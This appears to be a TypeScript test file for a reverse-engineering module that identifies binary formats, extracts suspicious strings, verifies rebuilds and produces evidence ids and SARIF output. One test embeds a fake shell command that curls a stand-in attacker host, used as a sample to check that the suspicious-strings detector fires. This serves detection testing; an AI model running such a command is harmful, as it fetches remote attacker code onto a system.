import { strict as assert } from "node:assert";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { test } from "node:test";
import { analyzeBinary, identify, printableStrings } from "../../re/binary.js";
import { rebuildVerify } from "../../re/rebuildVerify.js";
import { evidenceOf } from "../../re/types.js";
import { createReTools } from "../../tools/reTools.js";
import { toSarif } from "../normalize/funnel.js";

const tmp = (n: string): string => fs.mkdtempSync(path.join(os.tmpdir(), n));
const ctx = (ws: string) => ({ workspace: ws }) as never;

test("binary identity: PE, ELF, Mach-O, APK and unknown", () => {
  const pe = Buffer.alloc(0x100);
  pe.write("MZ", 0, "latin1"); pe.writeUInt32LE(0x80, 0x3c); pe.writeUInt32LE(0x00004550, 0x80); pe.writeUInt16LE(0x8664, 0x84);
  assert.deepEqual(pick(identify(pe)), { format: "PE", arch: "x86_64", bits: 64 });
  const elf = Buffer.from([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0x3e, 0]);
  assert.equal(identify(elf).format, "ELF"); assert.equal(identify(elf).arch, "x86_64");
  const macho = Buffer.alloc(32); macho.writeUInt32BE(0xfeedfacf, 0);
  assert.equal(identify(macho).format, "Mach-O");
  const zip = Buffer.alloc(600);
  zip.write("PK\x03\x04", 0, "latin1");
  zip.write("AndroidManifest.xml", 100, "latin1"); zip.write("classes.dex", 150, "latin1");
  assert.equal(identify(zip).format, "APK (zip)");
  assert.equal(identify(Buffer.from("plain text here")).format, "unknown");
});
const pick = (i: { format: string; arch?: string; bits?: number }) => ({ format: i.format, arch: i.arch, bits: i.bits });

test("analyzeBinary: identity finding with evidence, entropy and strings", () => {
  const elf = Buffer.concat([Buffer.from([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0]), Buffer.alloc(0x100), Buffer.from("/bin/sh -c curl https://x.evil.example/a\0")]);
  const { findings } = analyzeBinary("sample.elf", elf);
  const id = findings[0]!;
  assert.equal(id.ruleId, "re-identify");
  assert.equal(id.engine, "re");
  assert.ok(id.evidence.length >= 3);
  assert.ok(id.evidence.every((e) => /^ev_[a-f0-9]+$/.test(e.id)), "sha256 evidence ids");
  assert.ok(findings.some((f) => f.ruleId === "re-suspicious-strings"), "strings finding fires");
  assert.ok(printableStrings(Buffer.from("abcdefgh\0ijklmnop"), 6).includes("ijklmnop"));
});

test("rebuildVerify: js token similarity ignores whitespace; bytes verdict bands", () => {
  const d = tmp("loam-rv-");
  try {
    const a = path.join(d, "a.js"); const b = path.join(d, "b.js"); const c = path.join(d, "c.js");
    fs.writeFileSync(a, "const x = 1;\nfunction f(y){ return y + 1; }\n");
    fs.writeFileSync(b, "const  x=1;function f(y){return y+1;}" ); // same tokens, minified
    fs.writeFileSync(c, "export default class Z { run() { return 42; } }\n");
    const same = rebuildVerify(a, b, "js");
    assert.ok(same.matchPct > 95 && same.verdict === "match", `${same.matchPct}`);
    const diff = rebuildVerify(a, c, "js");
    assert.equal(diff.verdict, "mismatch");
    const bytes = rebuildVerify(a, a, "bytes");
    assert.equal(bytes.verdict, "match");
    assert.match(bytes.evidence.id, /^ev_[a-f0-9]+$/);
  } finally { fs.rmSync(d, { recursive: true, force: true }); }
});

test("re tools: analyze works offline; rebuild_verify wires through; decompile degrades honestly", async () => {
  const d = tmp("loam-ret-");
  try {
    const elf = Buffer.concat([Buffer.from([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0]), Buffer.alloc(0x80)]);
    fs.writeFileSync(path.join(d, "s.elf"), elf);
    fs.writeFileSync(path.join(d, "r.js"), "const q=1;");
    const tools = createReTools();
    const byName = new Map(tools.map((t) => [t.name, t]));
    const analyze = await byName.get("re_analyze")!.run({ file: "s.elf" }, ctx(d));
    assert.ok(analyze.ok);
    assert.ok(analyze.content.includes("re-identify"), "findings in summary");
    const summary = await byName.get("re_analyze")!.run({ file: "s.elf" }, ctx(d));
    assert.ok(summary.content.includes("ELF"));
    assert.ok(/rea-agents (available|not installed)/.test(summary.content), "engine availability stated");
    const rv = await byName.get("re_rebuild_verify")!.run({ original: "r.js", rebuilt: "r.js", kind: "js" }, ctx(d));
    assert.ok(rv.ok && rv.content.includes("match"));
    const missing = await byName.get("re_analyze")!.run({ file: "nope.bin" }, ctx(d));
    assert.ok(!missing.ok);
  } finally { fs.rmSync(d, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 }); }
});

test("evidence ids are content-bound (same content, same id)", () => {
  assert.equal(evidenceOf("magic", "f.bin", "ELF").id, evidenceOf("magic", "f.bin", "ELF").id);
  assert.notEqual(evidenceOf("magic", "f.bin", "ELF").id, evidenceOf("magic", "f.bin", "PE").id);
  const finding = { engine: "re" as const, ruleId: "r", severity: "info" as const, target: "t", title: "x", detail: "d", evidence: [evidenceOf("magic", "t", "n")] };
  assert.equal((toSarif([finding]).runs[0] as { results: unknown[] }).results.length, 0, "info severity stays out of SARIF results");
});
